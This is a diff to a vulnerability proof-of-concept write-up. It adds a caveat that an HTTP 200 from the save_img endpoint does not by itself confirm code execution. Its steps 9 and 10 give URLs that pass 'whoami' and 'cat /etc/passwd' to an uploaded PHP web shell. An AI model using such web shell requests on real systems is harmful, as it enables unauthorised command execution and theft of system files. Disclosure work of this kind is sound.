@@ -377,14 +377,16 @@ This JavaScript code performs an authenticated HTTP POST request to the Responsi
 
 ![RCE](./img/08.png)
 
+Result: The save_img endpoint returned HTTP 200 OK in response to the crafted POST request, indicating successful HTTP-level processing of the request. File creation and remote code execution require separate verification.
 
-### 9- Access the created file in link and provide "whoami" command with "cmd" parameter:
+
+### 9- Validate 1: Access the created file in link and provide "whoami" command with "cmd" parameter:
 http://192.168.1.193:8080/export/smithbraz.php?cmd=whoami
 
 ![RCE](./img/09.png)
 
 
-### 10- Access the created file in link and provide "cat /etc/passwd" command with "cmd" parameter:
+### 10- Validate 2: Access the created file in link and provide "cat /etc/passwd" command with "cmd" parameter:
 http://192.168.1.193:8080/export/smithbraz.php?cmd=cat /etc/passwd
 
 ![RCE](./img/10.png)
